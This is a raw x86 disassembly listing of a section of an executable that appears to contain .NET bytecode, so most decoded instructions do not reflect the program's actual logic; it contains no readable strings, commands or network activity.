  403fe1:	00 0a                	add    %cl,(%edx)
  403fe3:	08 16                	or     %dl,(%esi)
  403fe5:	6f                   	outsl  %ds:(%esi),(%dx)
  403fe6:	7a 00                	jp     0x403fe8
  403fe8:	00 0a                	add    %cl,(%edx)
  403fea:	08 72 d5             	or     %dh,-0x2b(%edx)
  403fed:	04 00                	add    $0x0,%al
  403fef:	70 28                	jo     0x404019
  403ff1:	78 00                	js     0x403ff3
  403ff3:	00 0a                	add    %cl,(%edx)
  403ff5:	6f                   	outsl  %ds:(%esi),(%dx)
  403ff6:	79 00                	jns    0x403ff8
  403ff8:	00 0a                	add    %cl,(%edx)
  403ffa:	08 72 df             	or     %dh,-0x21(%edx)
  403ffd:	04 00                	add    $0x0,%al
  403fff:	70 28                	jo     0x404029
  404001:	78 00                	js     0x404003
  404003:	00 0a                	add    %cl,(%edx)
  404005:	6f                   	outsl  %ds:(%esi),(%dx)
  404006:	79 00                	jns    0x404008
  404008:	00 0a                	add    %cl,(%edx)
  40400a:	08 1f                	or     %bl,(%edi)
  40400c:	10 6f 7a             	adc    %ch,0x7a(%edi)
  40400f:	00 00                	add    %al,(%eax)
  404011:	0a 08                	or     (%eax),%cl
  404013:	17                   	pop    %ss
  404014:	6f                   	outsl  %ds:(%esi),(%dx)
  404015:	7b 00                	jnp    0x404017
  404017:	00 0a                	add    %cl,(%edx)
  404019:	17                   	pop    %ss
  40401a:	0d 02 13 04 1e       	or     $0x1e041302,%eax
  40401f:	13 05 08 09 d1 6f    	adc    0x6fd10908,%eax
  404025:	7b 00                	jnp    0x404027
  404027:	00 0a                	add    %cl,(%edx)
  404029:	08 11                	or     %dl,(%ecx)
  40402b:	04 6f                	add    $0x6f,%al
  40402d:	7a 00                	jp     0x40402f
  40402f:	00 0a                	add    %cl,(%edx)
  404031:	08 11                	or     %dl,(%ecx)
  404033:	04 09                	add    $0x9,%al
  404035:	5a                   	pop    %edx
  404036:	11 05 5a 1e 5b 6f    	adc    %eax,0x6f5b1e5a
  40403c:	7a 00                	jp     0x40403e
  40403e:	00 0a                	add    %cl,(%edx)
  404040:	08 09                	or     %cl,(%ecx)
  404042:	11 05 5a 1e 5b d1    	adc    %eax,0xd15b1e5a
  404048:	6f                   	outsl  %ds:(%esi),(%dx)
  404049:	7b 00                	jnp    0x40404b
  40404b:	00 0a                	add    %cl,(%edx)
  40404d:	08 11                	or     %dl,(%ecx)
  40404f:	05 d1 6f 7b 00       	add    $0x7b6fd1,%eax
  404054:	00 0a                	add    %cl,(%edx)
  404056:	08 72 e9             	or     %dh,-0x17(%edx)
  404059:	04 00                	add    $0x0,%al
  40405b:	70 28                	jo     0x404085
  40405d:	78 00                	js     0x40405f
  40405f:	00 0a                	add    %cl,(%edx)
  404061:	6f                   	outsl  %ds:(%esi),(%dx)
  404062:	79 00                	jns    0x404064
  404064:	00 0a                	add    %cl,(%edx)
  404066:	03 13                	add    (%ebx),%edx
  404068:	06                   	push   %es
  404069:	11 04 11             	adc    %eax,(%ecx,%edx,1)
  40406c:	06                   	push   %es
  40406d:	5a                   	pop    %edx
  40406e:	8d 42 00             	lea    0x0(%edx),%eax
  404071:	00 01                	add    %al,(%ecx)
  404073:	13 07                	adc    (%edi),%eax
  404075:	1c 8d                	sbb    $0x8d,%al
  404077:	48                   	dec    %eax
  404078:	00 00                	add    %al,(%eax)
  40407a:	01 25 16 06 17 1f    	add    %esp,0x1f170616
  404080:	11 6f 70             	adc    %ebp,0x70(%edi)
  404083:	00 00                	add    %al,(%eax)
  404085:	0a 9e 25 17 06 17    	or     0x17061725(%esi),%bl
  40408b:	1f                   	pop    %ds
  40408c:	11 6f 70             	adc    %ebp,0x70(%edi)
  40408f:	00 00                	add    %al,(%eax)
  404091:	0a 9e 25 18 06 17    	or     0x17061825(%esi),%bl
  404097:	1f                   	pop    %ds
  404098:	11 6f 70             	adc    %ebp,0x70(%edi)
  40409b:	00 00                	add    %al,(%eax)
  40409d:	0a 9e 25 19 06 17    	or     0x17061925(%esi),%bl
  4040a3:	1f                   	pop    %ds
  4040a4:	11 6f 70             	adc    %ebp,0x70(%edi)
  4040a7:	00 00                	add    %al,(%eax)
  4040a9:	0a 9e 25 1a 06 17    	or     0x17061a25(%esi),%bl
  4040af:	1f                   	pop    %ds
  4040b0:	11 6f 70             	adc    %ebp,0x70(%edi)
  4040b3:	00 00                	add    %al,(%eax)
  4040b5:	0a 9e 25 1b 06 17    	or     0x17061b25(%esi),%bl
  4040bb:	1f                   	pop    %ds
  4040bc:	11 6f 70             	adc    %ebp,0x70(%edi)
  4040bf:	00 00                	add    %al,(%eax)
  4040c1:	0a 9e 13 08 18 13    	or     0x13180813(%esi),%bl
  4040c7:	09 2b                	or     %ebp,(%ebx)
  4040c9:	3a 11                	cmp    (%ecx),%dl
  4040cb:	07                   	pop    %es
  4040cc:	11 09                	adc    %ecx,(%ecx)
  4040ce:	11 09                	adc    %ecx,(%ecx)
  4040d0:	11 08                	adc    %ecx,(%eax)
  4040d2:	16                   	push   %ss
  4040d3:	94                   	xchg   %eax,%esp
  4040d4:	1f                   	pop    %ds
  4040d5:	1f                   	pop    %ds
  4040d6:	5f                   	pop    %edi
  4040d7:	63 11                	arpl   %edx,(%ecx)
  4040d9:	09 11                	or     %edx,(%ecx)
  4040db:	08 17                	or     %dl,(%edi)
  4040dd:	94                   	xchg   %eax,%esp
  4040de:	1f                   	pop    %ds
  4040df:	1f                   	pop    %ds
  4040e0:	5f                   	pop    %edi
  4040e1:	63 5a 11             	arpl   %ebx,0x11(%edx)
  4040e4:	09 11                	or     %edx,(%ecx)
  4040e6:	08 18                	or     %bl,(%eax)
  4040e8:	94                   	xchg   %eax,%esp
  4040e9:	1f                   	pop    %ds
  4040ea:	1f                   	pop    %ds
  4040eb:	5f                   	pop    %edi
  4040ec:	63 11                	arpl   %edx,(%ecx)
  4040ee:	09 11                	or     %edx,(%ecx)
  4040f0:	08 19                	or     %bl,(%ecx)
  4040f2:	94                   	xchg   %eax,%esp
  4040f3:	1f                   	pop    %ds
  4040f4:	1f                   	pop    %ds
  4040f5:	5f                   	pop    %edi
  4040f6:	63 61 60             	arpl   %esp,0x60(%ecx)
  4040f9:	11 09                	adc    %ecx,(%ecx)
  4040fb:	5a                   	pop    %edx
  4040fc:	d2 9c 11 09 17 58 13 	rcrb   %cl,0x13581709(%ecx,%edx,1)
  404103:	09 11                	or     %edx,(%ecx)
  404105:	09 11                	or     %edx,(%ecx)
  404107:	07                   	pop    %es
  404108:	8e 69 32             	mov    0x32(%ecx),%gs
  40410b:	be 08 11 07 8e       	mov    $0x8e071108,%esi
  404110:	69 09 5a 11 05 5a    	imul   $0x5a05115a,(%ecx),%ecx
  404116:	1e                   	push   %ds
  404117:	5b                   	pop    %ebx
  404118:	6f                   	outsl  %ds:(%esi),(%dx)
  404119:	7a 00                	jp     0x40411b
  40411b:	00 0a                	add    %cl,(%edx)
  40411d:	11 07                	adc    %eax,(%edi)
  40411f:	13 0a                	adc    (%edx),%ecx
  404121:	16                   	push   %ss
  404122:	13 0b                	adc    (%ebx),%ecx
  404124:	2b 15 11 0a 11 0b    	sub    0xb110a11,%edx
  40412a:	91                   	xchg   %eax,%ecx
  40412b:	13 0c 08             	adc    (%eax,%ecx,1),%ecx
  40412e:	11 0c 6f             	adc    %ecx,(%edi,%ebp,2)
  404131:	7c 00                	jl     0x404133
  404133:	00 0a                	add    %cl,(%edx)
  404135:	11 0b                	adc    %ecx,(%ebx)
  404137:	17                   	pop    %ss
  404138:	58                   	pop    %eax
  404139:	13 0b                	adc    (%ebx),%ecx
  40413b:	11 0b                	adc    %ecx,(%ebx)
  40413d:	11 0a                	adc    %ecx,(%edx)
  40413f:	8e 69 32             	mov    0x32(%ecx),%gs
  404142:	e3 08                	jecxz  0x40414c
  404144:	1a 16                	sbb    (%esi),%dl
  404146:	6f                   	outsl  %ds:(%esi),(%dx)
  404147:	7d 00                	jge    0x404149
  404149:	00 0a                	add    %cl,(%edx)
  40414b:	26 08 08             	or     %cl,%es:(%eax)
  40414e:	6f                   	outsl  %ds:(%esi),(%dx)
  40414f:	7e 00                	jle    0x404151
  404151:	00 0a                	add    %cl,(%edx)
  404153:	6f                   	outsl  %ds:(%esi),(%dx)
  404154:	7f 00                	jg     0x404156
  404156:	00 0a                	add    %cl,(%edx)
  404158:	1e                   	push   %ds
  404159:	6a 59                	push   $0x59
  40415b:	6d                   	insl   (%dx),%es:(%edi)
  40415c:	6f                   	outsl  %ds:(%esi),(%dx)
  40415d:	7a 00                	jp     0x40415f
  40415f:	00 0a                	add    %cl,(%edx)
  404161:	07                   	pop    %es
  404162:	16                   	push   %ss
  404163:	6a 16                	push   $0x16
  404165:	6f                   	outsl  %ds:(%esi),(%dx)
  404166:	80 00 00             	addb   $0x0,(%eax)
  404169:	0a 26                	or     (%esi),%ah
  40416b:	07                   	pop    %es
  40416c:	73 81                	jae    0x4040ef
  40416e:	00 00                	add    %al,(%eax)
  404170:	0a 28                	or     (%eax),%ch
  404172:	82 00 00             	addb   $0x0,(%eax)
  404175:	0a de                	or     %dh,%bl
  404177:	0a 07                	or     (%edi),%al
  404179:	2c 06                	sub    $0x6,%al
  40417b:	07                   	pop    %es
  40417c:	6f                   	outsl  %ds:(%esi),(%dx)
  40417d:	55                   	push   %ebp
  40417e:	00 00                	add    %al,(%eax)
  404180:	0a dc                	or     %ah,%bl
  404182:	2a 00                	sub    (%eax),%al
  404184:	41                   	inc    %ecx
  404185:	1c 00                	sbb    $0x0,%al
  404187:	00 02                	add    %al,(%edx)
  404189:	00 00                	add    %al,(%eax)
  40418b:	00 0c 00             	add    %cl,(%eax,%eax,1)
  40418e:	00 00                	add    %al,(%eax)
  404190:	ac                   	lods   %ds:(%esi),%al
  404191:	01 00                	add    %eax,(%eax)
  404193:	00 b8 01 00 00 0a    	add    %bh,0xa000001(%eax)
  404199:	00 00                	add    %al,(%eax)
  40419b:	00 00                	add    %al,(%eax)
  40419d:	00 00                	add    %al,(%eax)
  40419f:	00 1b                	add    %bl,(%ebx)
  4041a1:	30 07                	xor    %al,(%edi)
  4041a3:	00 bc 01 00 00 10 00 	add    %bh,0x100000(%ecx,%eax,1)
  4041aa:	00 11                	add    %dl,(%ecx)
  4041ac:	73 53                	jae    0x404201
  4041ae:	00 00                	add    %al,(%eax)
  4041b0:	0a 0a                	or     (%edx),%cl
  4041b2:	73 76                	jae    0x40422a
  4041b4:	00 00                	add    %al,(%eax)
  4041b6:	0a 0b                	or     (%ebx),%cl
  4041b8:	07                   	pop    %es
  4041b9:	73 77                	jae    0x404232
  4041bb:	00 00                	add    %al,(%eax)
  4041bd:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  4041c0:	72 cb                	jb     0x40418d
  4041c2:	04 00                	add    $0x0,%al
  4041c4:	70 28                	jo     0x4041ee
  4041c6:	78 00                	js     0x4041c8
  4041c8:	00 0a                	add    %cl,(%edx)
  4041ca:	6f                   	outsl  %ds:(%esi),(%dx)
  4041cb:	79 00                	jns    0x4041cd
  4041cd:	00 0a                	add    %cl,(%edx)
  4041cf:	08 16                	or     %dl,(%esi)
  4041d1:	6f                   	outsl  %ds:(%esi),(%dx)
  4041d2:	7a 00                	jp     0x4041d4
  4041d4:	00 0a                	add    %cl,(%edx)
  4041d6:	08 72 d5             	or     %dh,-0x2b(%edx)
  4041d9:	04 00                	add    $0x0,%al
  4041db:	70 28                	jo     0x404205
  4041dd:	78 00                	js     0x4041df
  4041df:	00 0a                	add    %cl,(%edx)
  4041e1:	6f                   	outsl  %ds:(%esi),(%dx)
  4041e2:	79 00                	jns    0x4041e4
  4041e4:	00 0a                	add    %cl,(%edx)
  4041e6:	08 72 df             	or     %dh,-0x21(%edx)
  4041e9:	04 00                	add    $0x0,%al
  4041eb:	70 28                	jo     0x404215
  4041ed:	78 00                	js     0x4041ef
  4041ef:	00 0a                	add    %cl,(%edx)
  4041f1:	6f                   	outsl  %ds:(%esi),(%dx)
  4041f2:	79 00                	jns    0x4041f4
  4041f4:	00 0a                	add    %cl,(%edx)
  4041f6:	08 1f                	or     %bl,(%edi)
  4041f8:	10 6f 7a             	adc    %ch,0x7a(%edi)
  4041fb:	00 00                	add    %al,(%eax)
  4041fd:	0a 08                	or     (%eax),%cl
  4041ff:	17                   	pop    %ss
  404200:	6f                   	outsl  %ds:(%esi),(%dx)
  404201:	7b 00                	jnp    0x404203
  404203:	00 0a                	add    %cl,(%edx)
  404205:	17                   	pop    %ss
  404206:	0d 02 13 04 1e       	or     $0x1e041302,%eax
  40420b:	13 05 08 09 d1 6f    	adc    0x6fd10908,%eax
  404211:	7b 00                	jnp    0x404213
  404213:	00 0a                	add    %cl,(%edx)
  404215:	08 11                	or     %dl,(%ecx)
  404217:	04 6f                	add    $0x6f,%al
  404219:	7a 00                	jp     0x40421b
  40421b:	00 0a                	add    %cl,(%edx)
  40421d:	08 11                	or     %dl,(%ecx)
  40421f:	04 09                	add    $0x9,%al
  404221:	5a                   	pop    %edx
  404222:	11 05 5a 1e 5b 6f    	adc    %eax,0x6f5b1e5a
  404228:	7a 00                	jp     0x40422a
  40422a:	00 0a                	add    %cl,(%edx)
  40422c:	08 09                	or     %cl,(%ecx)
  40422e:	11 05 5a 1e 5b d1    	adc    %eax,0xd15b1e5a
  404234:	6f                   	outsl  %ds:(%esi),(%dx)
  404235:	7b 00                	jnp    0x404237
  404237:	00 0a                	add    %cl,(%edx)
  404239:	08 11                	or     %dl,(%ecx)
  40423b:	05 d1 6f 7b 00       	add    $0x7b6fd1,%eax
  404240:	00 0a                	add    %cl,(%edx)
  404242:	08 72 e9             	or     %dh,-0x17(%edx)
  404245:	04 00                	add    $0x0,%al
  404247:	70 28                	jo     0x404271
  404249:	78 00                	js     0x40424b
  40424b:	00 0a                	add    %cl,(%edx)
  40424d:	6f                   	outsl  %ds:(%esi),(%dx)
  40424e:	79 00                	jns    0x404250
  404250:	00 0a                	add    %cl,(%edx)
  404252:	03 13                	add    (%ebx),%edx
  404254:	06                   	push   %es
  404255:	11 04 11             	adc    %eax,(%ecx,%edx,1)
  404258:	06                   	push   %es
  404259:	5a                   	pop    %edx
  40425a:	8d 42 00             	lea    0x0(%edx),%eax
  40425d:	00 01                	add    %al,(%ecx)
  40425f:	13 07                	adc    (%edi),%eax
  404261:	1c 8d                	sbb    $0x8d,%al
  404263:	48                   	dec    %eax
  404264:	00 00                	add    %al,(%eax)
  404266:	01 25 16 06 17 20    	add    %esp,0x20170616
  40426c:	00 04 00             	add    %al,(%eax,%eax,1)
  40426f:	00 6f 70             	add    %ch,0x70(%edi)
  404272:	00 00                	add    %al,(%eax)
  404274:	0a 9e 25 17 06 17    	or     0x17061725(%esi),%bl
  40427a:	1f                   	pop    %ds
  40427b:	11 6f 70             	adc    %ebp,0x70(%edi)
  40427e:	00 00                	add    %al,(%eax)
  404280:	0a 9e 25 18 06 17    	or     0x17061825(%esi),%bl
  404286:	1f                   	pop    %ds
  404287:	11 6f 70             	adc    %ebp,0x70(%edi)
  40428a:	00 00                	add    %al,(%eax)
  40428c:	0a 9e 25 19 06 17    	or     0x17061925(%esi),%bl
  404292:	1f                   	pop    %ds
  404293:	11 6f 70             	adc    %ebp,0x70(%edi)
  404296:	00 00                	add    %al,(%eax)
  404298:	0a 9e 25 1a 06 17    	or     0x17061a25(%esi),%bl
  40429e:	1f                   	pop    %ds
  40429f:	11 6f 70             	adc    %ebp,0x70(%edi)
  4042a2:	00 00                	add    %al,(%eax)
  4042a4:	0a 9e 25 1b 06 17    	or     0x17061b25(%esi),%bl
  4042aa:	1f                   	pop    %ds
  4042ab:	11 6f 70             	adc    %ebp,0x70(%edi)
  4042ae:	00 00                	add    %al,(%eax)
  4042b0:	0a 9e 13 08 18 13    	or     0x13180813(%esi),%bl
  4042b6:	09 2b                	or     %ebp,(%ebx)
  4042b8:	30 11                	xor    %dl,(%ecx)
  4042ba:	07                   	pop    %es
  4042bb:	11 09                	adc    %ecx,(%ecx)
  4042bd:	11 08                	adc    %ecx,(%eax)
  4042bf:	16                   	push   %ss
  4042c0:	94                   	xchg   %eax,%esp
  4042c1:	11 08                	adc    %ecx,(%eax)
  4042c3:	17                   	pop    %ss
  4042c4:	94                   	xchg   %eax,%esp
  4042c5:	11 09                	adc    %ecx,(%ecx)
  4042c7:	5a                   	pop    %edx
  4042c8:	11 08                	adc    %ecx,(%eax)
  4042ca:	18 94 1f 1f 5f 63 11 	sbb    %dl,0x11635f1f(%edi,%ebx,1)
  4042d1:	08 19                	or     %bl,(%ecx)
  4042d3:	94                   	xchg   %eax,%esp
  4042d4:	11 09                	adc    %ecx,(%ecx)
  4042d6:	5a                   	pop    %edx
  4042d7:	11 08                	adc    %ecx,(%eax)
  4042d9:	1a 94 1f 1f 5f 63 60 	sbb    0x60635f1f(%edi,%ebx,1),%dl
  4042e0:	5a                   	pop    %edx
  4042e1:	d2 9c 11 09 17 58 13 	rcrb   %cl,0x13581709(%ecx,%edx,1)
  4042e8:	09 11                	or     %edx,(%ecx)
  4042ea:	09 11                	or     %edx,(%ecx)
  4042ec:	07                   	pop    %es
  4042ed:	8e 69 32             	mov    0x32(%ecx),%gs
  4042f0:	c8 08 11 07          	enter  $0x1108,$0x7
  4042f4:	8e 69 09             	mov    0x9(%ecx),%gs
  4042f7:	5a                   	pop    %edx
  4042f8:	11 05 5a 1e 5b 6f    	adc    %eax,0x6f5b1e5a
  4042fe:	7a 00                	jp     0x404300
  404300:	00 0a                	add    %cl,(%edx)
  404302:	11 07                	adc    %eax,(%edi)
  404304:	13 0a                	adc    (%edx),%ecx
  404306:	16                   	push   %ss
  404307:	13 0b                	adc    (%ebx),%ecx
  404309:	2b 15 11 0a 11 0b    	sub    0xb110a11,%edx
  40430f:	91                   	xchg   %eax,%ecx
  404310:	13 0c 08             	adc    (%eax,%ecx,1),%ecx
  404313:	11 0c 6f             	adc    %ecx,(%edi,%ebp,2)
  404316:	7c 00                	jl     0x404318
  404318:	00 0a                	add    %cl,(%edx)
  40431a:	11 0b                	adc    %ecx,(%ebx)
  40431c:	17                   	pop    %ss
  40431d:	58                   	pop    %eax
  40431e:	13 0b                	adc    (%ebx),%ecx
  404320:	11 0b                	adc    %ecx,(%ebx)
  404322:	11 0a                	adc    %ecx,(%edx)
  404324:	8e 69 32             	mov    0x32(%ecx),%gs
  404327:	e3 08                	jecxz  0x404331
  404329:	1a 16                	sbb    (%esi),%dl
  40432b:	6f                   	outsl  %ds:(%esi),(%dx)
  40432c:	7d 00                	jge    0x40432e
  40432e:	00 0a                	add    %cl,(%edx)
  404330:	26 08 08             	or     %cl,%es:(%eax)
  404333:	6f                   	outsl  %ds:(%esi),(%dx)
  404334:	7e 00                	jle    0x404336
  404336:	00 0a                	add    %cl,(%edx)
  404338:	6f                   	outsl  %ds:(%esi),(%dx)
  404339:	7f 00                	jg     0x40433b
  40433b:	00 0a                	add    %cl,(%edx)
  40433d:	1e                   	push   %ds
  40433e:	6a 59                	push   $0x59
  404340:	6d                   	insl   (%dx),%es:(%edi)
  404341:	6f                   	outsl  %ds:(%esi),(%dx)
  404342:	7a 00                	jp     0x404344
  404344:	00 0a                	add    %cl,(%edx)
  404346:	07                   	pop    %es
  404347:	16                   	push   %ss
  404348:	6a 16                	push   $0x16
  40434a:	6f                   	outsl  %ds:(%esi),(%dx)
  40434b:	80 00 00             	addb   $0x0,(%eax)
  40434e:	0a 26                	or     (%esi),%ah
  404350:	07                   	pop    %es
  404351:	73 81                	jae    0x4042d4
  404353:	00 00                	add    %al,(%eax)
  404355:	0a 28                	or     (%eax),%ch
  404357:	82 00 00             	addb   $0x0,(%eax)
  40435a:	0a de                	or     %dh,%bl
  40435c:	0a 07                	or     (%edi),%al
  40435e:	2c 06                	sub    $0x6,%al
  404360:	07                   	pop    %es
  404361:	6f                   	outsl  %ds:(%esi),(%dx)
  404362:	55                   	push   %ebp
  404363:	00 00                	add    %al,(%eax)
  404365:	0a dc                	or     %ah,%bl
  404367:	2a 41 1c             	sub    0x1c(%ecx),%al
  40436a:	00 00                	add    %al,(%eax)
  40436c:	02 00                	add    (%eax),%al
  40436e:	00 00                	add    %al,(%eax)
  404370:	0c 00                	or     $0x0,%al
  404372:	00 00                	add    %al,(%eax)
  404374:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  404375:	01 00                	add    %eax,(%eax)
  404377:	00 b1 01 00 00 0a    	add    %dh,0xa000001(%ecx)
  40437d:	00 00                	add    %al,(%eax)
  40437f:	00 00                	add    %al,(%eax)
  404381:	00 00                	add    %al,(%eax)
  404383:	00 13                	add    %dl,(%ebx)
  404385:	30 04 00             	xor    %al,(%eax,%eax,1)
  404388:	bc 00 00 00 00       	mov    $0x0,%esp
  40438d:	00 00                	add    %al,(%eax)
  40438f:	00 1f                	add    %bl,(%edi)
  404391:	10 8d 66 00 00 01    	adc    %cl,0x1000066(%ebp)
  404397:	25 d0 21 00 00       	and    $0x21d0,%eax
  40439c:	04 28                	add    $0x28,%al
  40439e:	64 00 00             	add    %al,%fs:(%eax)
  4043a1:	0a 80 16 00 00 04    	or     0x4000016(%eax),%al
  4043a7:	17                   	pop    %ss
  4043a8:	8d 48 00             	lea    0x0(%eax),%ecx
  4043ab:	00 01                	add    %al,(%ecx)
  4043ad:	80 17 00             	adcb   $0x0,(%edi)
  4043b0:	00 04 1b             	add    %al,(%ebx,%ebx,1)
  4043b3:	8d 0e                	lea    (%esi),%ecx
  4043b5:	00 00                	add    %al,(%eax)
  4043b7:	02 25 16 20 08 00    	add    0x82016,%ah
  4043bd:	33 00                	xor    (%eax),%eax
  4043bf:	9e                   	sahf
  4043c0:	25 17 20 20 00       	and    $0x202017,%eax
  4043c5:	cc                   	int3
  4043c6:	00 9e 25 18 20 c6    	add    %bl,-0x39dfe7db(%esi)
  4043cc:	00 88 00 9e 25 19    	add    %cl,0x19259e00(%eax)
  4043d2:	20 46 00             	and    %al,0x0(%esi)
  4043d5:	66 00 9e 25 1a 20 86 	data16 add %bl,-0x79dfe5db(%esi)
  4043dc:	00 ee                	add    %ch,%dh
  4043de:	00 9e 80 18 00 00    	add    %bl,0x1880(%esi)
  4043e4:	04 1e                	add    $0x1e,%al
  4043e6:	8d 5e 00             	lea    0x0(%esi),%ebx
  4043e9:	00 01                	add    %al,(%ecx)
  4043eb:	25 16 72 d6 02       	and    $0x2d67216,%eax
  4043f0:	00 70 a2             	add    %dh,-0x5e(%eax)
  4043f3:	25 17 72 f3 04       	and    $0x4f37217,%eax
  4043f8:	00 70 a2             	add    %dh,-0x5e(%eax)
  4043fb:	25 18 72 0b 05       	and    $0x50b7218,%eax
  404400:	00 70 a2             	add    %dh,-0x5e(%eax)
  404403:	25 19 72 19 05       	and    $0x5197219,%eax
  404408:	00 70 a2             	add    %dh,-0x5e(%eax)
  40440b:	25 1a 72 29 05       	and    $0x529721a,%eax
  404410:	00 70 a2             	add    %dh,-0x5e(%eax)
  404413:	25 1b 72 37 05       	and    $0x537721b,%eax
  404418:	00 70 a2             	add    %dh,-0x5e(%eax)
  40441b:	25 1c 72 47 05       	and    $0x547721c,%eax
  404420:	00 70 a2             	add    %dh,-0x5e(%eax)
  404423:	25 1d 72 5d 05       	and    $0x55d721d,%eax
  404428:	00 70 a2             	add    %dh,-0x5e(%eax)
  40442b:	80 19 00             	sbbb   $0x0,(%ecx)
  40442e:	00 04 18             	add    %al,(%eax,%ebx,1)
  404431:	8d 16                	lea    (%esi),%edx
  404433:	00 00                	add    %al,(%eax)
  404435:	01 25 16 28 52 00    	add    %esp,0x522816
  40443b:	00 06                	add    %al,(%esi)
  40443d:	a2 25 17 28 53       	mov    %al,0x53281725
  404442:	00 00                	add    %al,(%eax)
  404444:	06                   	push   %es
  404445:	a2 80 1a 00 00       	mov    %al,0x1a80
  40444a:	04 2a                	add    $0x2a,%al
  40444c:	1e                   	push   %ds
  40444d:	02 28                	add    (%eax),%ch
  40444f:	83 00 00             	addl   $0x0,(%eax)
  404452:	0a 2a                	or     (%edx),%ch
  404454:	ae                   	scas   %es:(%edi),%al
  404455:	7e 1b                	jle    0x404472
  404457:	00 00                	add    %al,(%eax)
  404459:	04 2d                	add    $0x2d,%al
  40445b:	1e                   	push   %ds
  40445c:	72 67                	jb     0x4044c5
  40445e:	05 00 70 d0 05       	add    $0x5d07000,%eax
  404463:	00 00                	add    %al,(%eax)
  404465:	02 28                	add    (%eax),%ch
  404467:	84 00                	test   %al,(%eax)
  404469:	00 0a                	add    %cl,(%edx)
  40446b:	6f                   	outsl  %ds:(%esi),(%dx)
  40446c:	85 00                	test   %eax,(%eax)
  40446e:	00 0a                	add    %cl,(%edx)
  404470:	73 86                	jae    0x4043f8
  404472:	00 00                	add    %al,(%eax)
  404474:	0a 80 1b 00 00 04    	or     0x400001b(%eax),%al
  40447a:	7e 1b                	jle    0x404497
  40447c:	00 00                	add    %al,(%eax)
  40447e:	04 2a                	add    $0x2a,%al
  404480:	1a 7e 1c             	sbb    0x1c(%esi),%bh
  404483:	00 00                	add    %al,(%eax)
  404485:	04 2a                	add    $0x2a,%al
  404487:	1e                   	push   %ds
  404488:	02 80 1c 00 00 04    	add    0x400001c(%eax),%al
  40448e:	2a 6a 28             	sub    0x28(%edx),%ch
  404491:	4f                   	dec    %edi
  404492:	00 00                	add    %al,(%eax)
  404494:	06                   	push   %es
  404495:	72 a9                	jb     0x404440
  404497:	05 00 70 7e 1c       	add    $0x1c7e7000,%eax
  40449c:	00 00                	add    %al,(%eax)
  40449e:	04 6f                	add    $0x6f,%al
  4044a0:	87 00                	xchg   %eax,(%eax)
  4044a2:	00 0a                	add    %cl,(%edx)
  4044a4:	74 19                	je     0x4044bf
  4044a6:	00 00                	add    %al,(%eax)
  4044a8:	01 2a                	add    %ebp,(%edx)
  4044aa:	6a 28                	push   $0x28
  4044ac:	4f                   	dec    %edi
  4044ad:	00 00                	add    %al,(%eax)
  4044af:	06                   	push   %es
  4044b0:	72 09                	jb     0x4044bb
  4044b2:	06                   	push   %es
  4044b3:	00 70 7e             	add    %dh,0x7e(%eax)
  4044b6:	1c 00                	sbb    $0x0,%al
  4044b8:	00 04 6f             	add    %al,(%edi,%ebp,2)
  4044bb:	87 00                	xchg   %eax,(%eax)
  4044bd:	00 0a                	add    %cl,(%edx)
  4044bf:	74 19                	je     0x4044da
  4044c1:	00 00                	add    %al,(%eax)
  4044c3:	01 2a                	add    %ebp,(%edx)
  4044c5:	6a 28                	push   $0x28
  4044c7:	4f                   	dec    %edi
  4044c8:	00 00                	add    %al,(%eax)
  4044ca:	06                   	push   %es
  4044cb:	72 6f                	jb     0x40453c
  4044cd:	06                   	push   %es
  4044ce:	00 70 7e             	add    %dh,0x7e(%eax)
  4044d1:	1c 00                	sbb    $0x0,%al
  4044d3:	00 04 6f             	add    %al,(%edi,%ebp,2)
  4044d6:	87 00                	xchg   %eax,(%eax)
  4044d8:	00 0a                	add    %cl,(%edx)
  4044da:	74 19                	je     0x4044f5
  4044dc:	00 00                	add    %al,(%eax)
  4044de:	01 2a                	add    %ebp,(%edx)
  4044e0:	1a 7e 1d             	sbb    0x1d(%esi),%bh
  4044e3:	00 00                	add    %al,(%eax)
  4044e5:	04 2a                	add    $0x2a,%al
  4044e7:	1e                   	push   %ds
  4044e8:	02 28                	add    (%eax),%ch
  4044ea:	88 00                	mov    %al,(%eax)
  4044ec:	00 0a                	add    %cl,(%edx)
  4044ee:	2a 56 73             	sub    0x73(%esi),%dl
  4044f1:	56                   	push   %esi
  4044f2:	00 00                	add    %al,(%eax)
  4044f4:	06                   	push   %es
  4044f5:	28 89 00 00 0a 74    	sub    %cl,0x740a0000(%ecx)
  4044fb:	06                   	push   %es
  4044fc:	00 00                	add    %al,(%eax)
  4044fe:	02 80 1d 00 00 04    	add    0x400001d(%eax),%al
  404504:	2a 06                	sub    (%esi),%al
  404506:	2a 00                	sub    (%eax),%al
  404508:	1b 30                	sbb    (%eax),%esi
  40450a:	09 00                	or     %eax,(%eax)
  40450c:	1e                   	push   %ds
  40450d:	02 00                	add    (%eax),%al
  40450f:	00 11                	add    %dl,(%ecx)
  404511:	00 00                	add    %al,(%eax)
  404513:	11 03                	adc    %eax,(%ebx)
  404515:	28 8a 00 00 0a 0a    	sub    %cl,0xa0a0000(%edx)
  40451b:	28 8b 00 00 0a 6f    	sub    %cl,0x6f0a0000(%ebx)
  404521:	8c 00                	mov    %es,(%eax)
  404523:	00 0a                	add    %cl,(%edx)
  404525:	13 0b                	adc    (%ebx),%ecx
  404527:	12 0b                	adc    (%ebx),%cl
  404529:	28 2b                	sub    %ch,(%ebx)
  40452b:	00 00                	add    %al,(%eax)
  40452d:	0a 28                	or     (%eax),%ch
  40452f:	8b 00                	mov    (%eax),%eax
  404531:	00 0a                	add    %cl,(%edx)
  404533:	6f                   	outsl  %ds:(%esi),(%dx)
  404534:	8c 00                	mov    %es,(%eax)
  404536:	00 0a                	add    %cl,(%edx)
  404538:	13 0b                	adc    (%ebx),%ecx
  40453a:	12 0b                	adc    (%ebx),%cl
  40453c:	28 2c 00             	sub    %ch,(%eax,%eax,1)
  40453f:	00 0a                	add    %cl,(%edx)
  404541:	20 0a                	and    %cl,(%edx)
  404543:	20 26                	and    %ah,(%esi)
  404545:	00 73 8d             	add    %dh,-0x73(%ebx)
  404548:	00 00                	add    %al,(%eax)
  40454a:	0a 25 28 20 00 00    	or     0x2028,%ah
  404550:	0a 28                	or     (%eax),%ch
  404552:	8b 00                	mov    (%eax),%eax
  404554:	00 0a                	add    %cl,(%edx)
  404556:	6f                   	outsl  %ds:(%esi),(%dx)
  404557:	8c 00                	mov    %es,(%eax)
  404559:	00 0a                	add    %cl,(%edx)
  40455b:	13 0b                	adc    (%ebx),%ecx
